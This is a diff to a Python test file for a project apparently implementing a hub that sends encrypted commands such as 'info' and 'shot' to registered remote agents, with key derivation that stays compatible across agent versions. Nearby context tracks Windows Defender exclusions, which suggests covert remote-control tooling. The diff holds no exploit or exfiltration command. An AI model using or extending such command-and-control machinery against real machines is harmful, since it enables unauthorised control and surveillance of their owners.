@@ -122,8 +122,10 @@ class TestConfig(unittest.TestCase):
         from syspy import packaging
         with tempfile.TemporaryDirectory() as tmp:
             os.makedirs(os.path.join(tmp, "syspy"), exist_ok=True)
-            open(os.path.join(tmp, "agent.py"), "w").write("x = 1\n")
-            open(os.path.join(tmp, "syspy", "config.py"), "w").write("y = 2\n")
+            with open(os.path.join(tmp, "agent.py"), "w", encoding="utf-8") as f:
+                f.write("x = 1\n")
+            with open(os.path.join(tmp, "syspy", "config.py"), "w", encoding="utf-8") as f:
+                f.write("y = 2\n")
             blob = packaging.build_zip_from_dir(tmp)
             import io
             import zipfile
@@ -141,6 +143,61 @@ class TestMachineState(unittest.TestCase):
         self.assertIn("C:/x", machine_state.get("defender_exclusions"))
         machine_state.forget("defender_exclusions")
         self.assertEqual(machine_state.get("defender_exclusions"), {})
+
+
+class TestHubLegacyInteroperability(unittest.TestCase):
+    def test_send_to_legacy_and_modern_agents(self):
+        from syspy.server.hub import Hub
+        from syspy import config, crypto, protocol
+
+        class DummyClient:
+            def __init__(self):
+                self.alive = True
+                self.published = []
+            def publish_wait(self, topic, payload, qos=1, timeout=6.0):
+                self.published.append((topic, payload))
+                return True
+
+        master_key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT, config.KDF_ITERATIONS)
+        with tempfile.TemporaryDirectory() as tmp:
+            hub = Hub(master_key, tmp)
+            dummy = DummyClient()
+            hub._client = dummy
+
+            # 1. Register a legacy agent (v5.1.1)
+            remote_id = "test-legacy-123"
+            agent_id = "agent:" + remote_id
+            hub._register(agent_id, remote_id, {"t": "hello", "ver": "5.1.1", "name": "LEGACY-PC"})
+            agent = hub.get(agent_id)
+            self.assertTrue(agent.use_master_key)
+
+            # Send a command to legacy agent
+            hub.send(agent_id, {"t": "cmd", "d": "info"})
+            topic, payload = dummy.published.pop()
+
+            # Old agent decodes with master_key fmt=1
+            old_agent_codec = protocol.Codec(master_key, fmt=1)
+            msg, reason = old_agent_codec.decode_message(payload)
+            self.assertEqual(reason, protocol.REASON_OK)
+            self.assertEqual(msg.get("d"), "info")
+
+            # 2. Register a modern agent (v5.2.0)
+            remote_id_v2 = "test-modern-456"
+            agent_id_v2 = "agent:" + remote_id_v2
+            hub._register(agent_id_v2, remote_id_v2, {"t": "hello", "ver": "5.2.0", "proto": 2, "fmt": 2, "name": "MODERN-PC"})
+            agent_v2 = hub.get(agent_id_v2)
+            self.assertFalse(agent_v2.use_master_key)
+
+            # Send a command to modern agent
+            hub.send(agent_id_v2, {"t": "cmd", "d": "shot"})
+            topic2, payload2 = dummy.published.pop()
+
+            # Modern agent decodes with subkey fmt=2
+            sub = crypto.subkey(master_key, remote_id_v2)
+            new_agent_codec = protocol.Codec(sub, fmt=2)
+            msg2, reason2 = new_agent_codec.decode_message(payload2)
+            self.assertEqual(reason2, protocol.REASON_OK)
+            self.assertEqual(msg2.get("d"), "shot")
 
 
 if __name__ == "__main__":
